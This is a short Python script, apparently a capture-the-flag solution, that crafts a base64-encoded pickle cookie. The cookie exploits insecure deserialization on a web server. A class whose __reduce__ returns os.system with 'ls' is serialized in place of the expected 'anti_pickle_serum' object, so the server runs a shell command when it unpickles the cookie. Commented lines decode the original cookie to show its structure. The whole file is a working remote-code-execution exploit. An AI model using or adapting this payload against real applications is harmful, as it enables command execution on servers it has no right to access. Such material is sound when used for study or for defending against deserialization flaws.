#/usr/bin/python3
import pickle
import ctypes
import base64
import os

# Add here code so there are no errors 0x7f1989589750
#/class anti_pickle_serum:
#    def __init__(self) -> None:
#        pass
#
class ani_pickle_serum:
    def __reduce__(self):
        return os.system,('ls',)


# Input: cookie plan_b
#plan_b_encoded=b'KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu'
#
## Decode
##plan_b_decoded=base64.b64decode(plan_b_encoded)
#plan_b_decoded=b"(dp0\nS'serum'\np1\nccopy_reg\n_reconstructor\np2\n(c__main__\nanti_pickle_serum\np3\nc__builtin__\nobject\np4\nNtp5\nRp6\ns."
#print(f'Decoded cookie: {plan_b_decoded}')
#
## Deserialization:
#
#serum=pickle.loads(plan_b_decoded)
#print(f'Deserialization: {serum}')

# Payload
payload=pickle.dumps({'serum':ani_pickle_serum()},protocol=0)

print(base64.b64encode(payload))